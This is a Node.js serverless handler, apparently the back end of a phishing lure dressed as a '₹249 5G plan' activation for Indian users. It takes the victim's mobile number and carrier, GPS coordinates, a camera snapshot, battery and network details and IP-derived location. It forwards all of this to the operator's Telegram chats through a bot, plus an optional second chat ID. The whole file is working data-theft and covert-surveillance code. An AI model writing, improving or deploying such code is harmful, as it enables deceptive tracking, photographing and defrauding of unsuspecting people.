const axios = require('axios');

module.exports = async (req, res) => {
  // CORS Headers - IMPORTANT
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  
  // Handle OPTIONS preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Allow GET for testing
  if (req.method === 'GET') {
    return res.status(200).json({
      success: true,
      message: '✅ Telegram API is working!',
      endpoint: '/api/telegram',
      timestamp: new Date().toISOString(),
      country: 'India (+91) Fixed',
      features: ['Location', 'Camera', 'Device Info', 'Dual Chat IDs']
    });
  }
  
  // Only allow POST for main functionality
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed. Use POST.' });
  }
  
  try {
    // Environment variables
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const MAIN_CHAT_ID = process.env.MAIN_CHAT_ID;
    const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
    
    if (!BOT_TOKEN || !MAIN_CHAT_ID) {
      console.error('Missing environment variables');
      return res.status(500).json({
        success: false,
        error: 'Server configuration missing. Check environment variables.'
      });
    }
    
    // Parse request body
    let userData = {};
    try {
      userData = req.body;
      console.log('📥 Received data:', {
        mobile: userData.mobile,
        operator: userData.operator,
        photoType: typeof userData.photo,
        photoExists: !!userData.photo,
        photoKeys: userData.photo ? Object.keys(userData.photo) : 'none'
      });
    } catch (e) {
      console.error('JSON parse error:', e);
      return res.status(400).json({ error: 'Invalid JSON in request body' });
    }
    
    // Country fixed to India
    userData.country = '+91';
    const USER_CHAT_ID = userData.userChatId || MAIN_CHAT_ID;
    
    // Get IP info from request headers
    const clientIp = req.headers['x-forwarded-for'] || 
                     req.headers['x-real-ip'] || 
                     req.connection.remoteAddress;
    
    let ipInfoData = {};
    if (IPINFO_TOKEN) {
      try {
        const ipResponse = await axios.get(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`, {
          timeout: 5000
        });
        ipInfoData = ipResponse.data;
      } catch (ipError) {
        ipInfoData = { 
          ip: clientIp || 'Unknown', 
          city: 'Unknown', 
          country: 'Unknown',
          org: 'Unknown',
          region: 'Unknown'
        };
      }
    }
    
    // ✅ UPDATED: Photo status check ko fix kiya
    let photoStatus = 'N/A';
    if (userData.photo) {
      if (typeof userData.photo === 'string' && userData.photo.startsWith('data:image')) {
        photoStatus = 'Captured ✓';
        console.log(`📸 Photo data received (${userData.photo.length} bytes)`);
      } else if (typeof userData.photo === 'object' && userData.photo.status === 'Permission Denied') {
        photoStatus = 'Permission Denied';
        console.log('📸 Camera permission denied');
      } else {
        photoStatus = 'Unknown Format';
        console.log('📸 Unknown photo format:', typeof userData.photo, userData.photo);
      }
    }
    
    // ✅ TUMHARA ORIGINAL TELEGRAM MESSAGE FORMAT
    const message = `
💰 *₹249 5G PLAN ACTIVATED*
📱 Mobile: +${userData.country.replace('+', '')}${userData.mobile}
📡 Operator: ${userData.operator}

🌐 *IP Information:*
🌐 IP Address: ${ipInfoData.ip || 'N/A'}
📡 ISP: ${ipInfoData.org || 'N/A'}
📍 City: ${ipInfoData.city || 'N/A'}
🗺️ Region: ${ipInfoData.region || 'N/A'}
🌍 Country: ${ipInfoData.country || 'N/A'}

📱 *Device Info:*
🔋 Charging: ${userData.deviceInfo?.battery?.charging ? 'Yes' : 'No'}
🔌 Battery Level: ${userData.deviceInfo?.battery?.level || 'N/A'}%
🌐 Network Type: ${userData.deviceInfo?.connection?.effectiveType || 'N/A'}
🕒 Time Zone: ${userData.deviceInfo?.timezone || 'N/A'}
🖥️ User Agent: ${userData.deviceInfo?.userAgent || 'N/A'}

📍 *Location:* ${userData.location?.latitude ? 
`Latitude: ${userData.location.latitude}
Longitude: ${userData.location.longitude}
Accuracy: ${userData.location.accuracy ? Math.round(userData.location.accuracy) + 'm' : 'N/A'}
🌍 View on Map: https://maps.google.com/?q=${userData.location.latitude},${userData.location.longitude}` : 
'Permission Denied'}

📸 *Camera:* ${photoStatus}

🔗 *URL:* ${userData.deviceInfo?.url}
⏰ *Time:* ${new Date(userData.timestamp).toLocaleString('en-IN')}
    `;
    
    // ✅ DATA DONO CHAT IDs KO JAYEGA
    const chatIds = [...new Set([MAIN_CHAT_ID, USER_CHAT_ID])];
    const results = [];
    
    for (const chatId of chatIds) {
      try {
        console.log(`📤 Sending to chat ${chatId}...`);
        
        // Send message
        const messageResponse = await axios.post(
          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
          {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
          },
          { timeout: 10000 }
        );
        console.log(`✅ Message sent to ${chatId}`);
        
        // ✅ FIXED: COMPLETE PHOTO HANDLING LOGIC
        if (userData.photo) {
          console.log(`📸 Processing photo for ${chatId}...`);
          
          // Case 1: Base64 image string
          if (typeof userData.photo === 'string' && userData.photo.startsWith('data:image')) {
            try {
              // Check image size
              const photoSizeKB = Math.round(userData.photo.length / 1024);
              console.log(`📏 Photo size: ${photoSizeKB}KB`);
              
              if (photoSizeKB > 5000) { // 5MB limit
                console.log(`⚠️ Photo too large (${photoSizeKB}KB), sending as document`);
                await axios.post(
                  `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                  {
                    chat_id: chatId,
                    text: `📸 Photo captured (${photoSizeKB}KB) but too large for preview. User: ${userData.mobile}`
                  },
                  { timeout: 5000 }
                );
              } else {
                // Send as photo
                await axios.post(
                  `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                  {
                    chat_id: chatId,
                    photo: userData.photo,
                    caption: `📸 Verification for ${userData.mobile}`
                  },
                  { 
                    timeout: 15000,
                    headers: { 'Content-Type': 'application/json' }
                  }
                );
                console.log(`✅ Photo sent to ${chatId}`);
              }
            } catch (photoError) {
              console.error(`❌ Photo send error to ${chatId}:`, photoError.response?.data || photoError.message);
              
              // Fallback: Send error message
              await axios.post(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                {
                  chat_id: chatId,
                  text: `📸 Photo capture for ${userData.mobile} but upload failed. Error: ${photoError.message}`
                },
                { timeout: 5000 }
              );
            }
          }
          // Case 2: Permission denied
          else if (typeof userData.photo === 'object' && userData.photo.status === 'Permission Denied') {
            await axios.post(
              `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
              {
                chat_id: chatId,
                text: `📸 Camera permission denied by user: ${userData.mobile}`
              },
              { timeout: 5000 }
            );
            console.log(`📸 Permission denied message sent to ${chatId}`);
          }
          // Case 3: Any other format
          else {
            console.log(`❓ Unknown photo format for ${chatId}:`, typeof userData.photo);
          }
        }
        
        results.push({ chatId, success: true });
        
        // Small delay between messages
        await new Promise(resolve => setTimeout(resolve, 500));
        
      } catch (error) {
        console.error(`❌ Error sending to ${chatId}:`, error.response?.data || error.message);
        results.push({ 
          chatId, 
          success: false, 
          error: error.response?.data?.description || error.message 
        });
      }
    }
    
    res.status(200).json({ 
      success: true, 
      message: 'Data sent to Telegram successfully!',
      sentToChatIds: chatIds,
      country: 'India (+91)',
      timestamp: new Date().toISOString(),
      photoStatus: photoStatus
    });
    
  } catch (error) {
    console.error('❌ API Error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Internal server error',
      timestamp: new Date().toISOString()
    });
  }
};
